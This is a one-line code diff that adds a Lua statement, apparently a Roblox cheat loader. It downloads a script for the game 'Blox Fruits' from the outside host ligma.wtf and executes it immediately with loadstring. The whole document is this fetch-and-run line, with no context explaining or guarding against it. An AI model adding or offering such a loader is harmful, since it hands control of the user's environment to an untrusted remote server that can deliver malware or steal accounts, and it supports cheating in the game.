@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("http://ligma.wtf/scripts/bloxfruits.lua", true))()
